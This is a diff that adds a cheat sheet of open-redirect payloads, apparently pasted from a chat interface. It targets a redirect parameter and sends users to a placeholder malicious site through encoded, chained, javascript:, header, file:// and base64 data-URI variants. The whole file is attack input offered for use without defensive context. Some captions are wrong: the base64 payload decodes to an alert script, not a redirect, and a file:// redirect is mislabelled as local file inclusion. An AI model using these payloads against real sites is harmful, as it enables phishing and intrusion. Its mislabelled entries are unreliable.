@@ -1,0 +1,50 @@
+Basic Open Redirect
+
+bash
+Copy
+http://example.com/redirect?url=http://malicious-site.com
+Using URL-encoded Redirection
+
+perl
+Copy
+http://example.com/redirect?url=http%3A%2F%2Fmalicious-site.com
+Double Redirection (Chained Redirects)
+
+bash
+Copy
+http://example.com/redirect?url=http://example.com/redirect?url=http://malicious-site.com
+Redirect to External URL (query parameter-based)
+
+bash
+Copy
+http://example.com/redirect?target=https://malicious-site.com
+Using JavaScript for Redirection
+
+pgsql
+Copy
+http://example.com/redirect?url=javascript:window.location='http://malicious-site.com'
+Redirection with Fragment Identifiers
+
+bash
+Copy
+http://example.com/redirect?url=http://malicious-site.com#phishing
+More Advanced Open Redirect Payloads
+These payloads take advantage of HTTP headers or specific parameters to induce redirection.
+
+Using window.location in the Location Header (for XSS/Open Redirect)
+
+pgsql
+Copy
+HTTP/1.1 301 Moved Permanently
+Location: javascript:window.location='http://malicious-site.com'
+File Protocol for Local File Redirection (Local File Inclusion exploit)
+
+perl
+Copy
+http://example.com/redirect?url=file:///etc/passwd
+Redirect via Base64 Encoding
+
+bash
+Copy
+http://example.com/redirect?url=data:text/html;base64,PGh0bWw+PHNjcmlwdD5hbGVydCgnUGhpbnlmaWxsIGZyb20gdGVzdCcpPC9zY3JpcHQ+PC9odG1sPg==
+This would encode JavaScript that redirects to a malicious site.
